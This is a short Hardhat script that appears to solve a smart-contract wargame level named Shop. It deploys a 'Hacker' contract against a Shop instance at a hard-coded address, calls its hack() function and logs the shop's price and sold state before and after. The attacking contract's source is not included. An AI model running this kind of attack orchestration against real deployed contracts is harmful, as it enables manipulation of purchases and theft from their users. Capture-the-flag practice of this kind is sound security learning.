const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    const Shop = await ethers.getContractFactory("Shop");
    const shop = Shop.attach(instance_address);

    console.log('Deploying Hacker contract...');
    const Hacker = await ethers.getContractFactory("Hacker");
    const hacker = await Hacker.deploy(shop.address);
    await hacker.deployed();

    console.log(`Shop price: ${await shop.price()}`);
    console.log(`Shop isSold: ${await shop.isSold()}`);

    // Call hack() on hacker
    console.log('Hacking...');
    let tx = await hacker.hack();
    await tx.wait(10);

    console.log(`Shop price: ${await shop.price()}`);
    console.log(`Shop isSold: ${await shop.isSold()}`);

    console.log('Success!')

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0x429D74e39989F787C34eA9aB74c2102012E7F301';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
